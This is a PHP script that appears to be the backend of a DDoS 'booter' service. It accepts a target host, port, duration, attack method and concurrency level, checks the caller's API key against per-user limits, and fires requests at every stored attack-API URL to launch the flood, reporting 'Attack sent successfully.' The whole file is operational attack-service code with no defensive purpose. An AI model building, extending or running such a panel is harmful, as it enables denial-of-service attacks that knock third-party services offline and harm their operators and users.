<?php
$mysqli = new mysqli("localhost", "username", "password", "dbname"); // Ganti sesuai
if ($mysqli->connect_error) {
    http_response_code(500);
    die(json_encode(["message" => "DB connection failed."]));
}

header("Content-Type: application/json");

if ($_GET['action'] === 'startAttack') {
    $postData = json_decode(file_get_contents("php://input"), true);

    $host = htmlspecialchars($postData['host']);
    $port = intval($postData['port']);
    $time = intval($postData['time']);
    $method = htmlspecialchars($postData['method']);
    $key = $mysqli->real_escape_string($postData['key']);
    $concurrents = intval($postData['concurrents']);

    if (empty($host) || empty($port) || empty($time) || empty($method) || empty($key)) {
        echo json_encode(["message" => "Missing parameters."]);
        exit;
    }

    $user = $mysqli->query("SELECT * FROM users WHERE apikey = '$key' LIMIT 1")->fetch_assoc();
    if (!$user) {
        echo json_encode(["message" => "Invalid API key."]);
        exit;
    }

    if ($time > $user['maxtime']) {
        echo json_encode(["message" => "Time exceeds limit ({$user['maxtime']}s)."]);
        exit;
    }

    if ($concurrents > $user['concurrents']) {
        echo json_encode(["message" => "Concurrents exceeds limit ({$user['concurrents']})."]);
        exit;
    }

    $result = $mysqli->query("SELECT * FROM apis");
    while ($row = $result->fetch_assoc()) {
        $url = str_replace(
            ['{host}', '{port}', '{time}', '{method}'],
            [$host, $port, $time, $method],
            $row['apiurl']
        );

        for ($i = 0; $i < $concurrents; $i++) {
            file_get_contents($url); // Simple trigger
        }
    }

    echo json_encode(["message" => "Attack sent successfully."]);
    exit;
}

echo json_encode(["message" => "Invalid action."]);
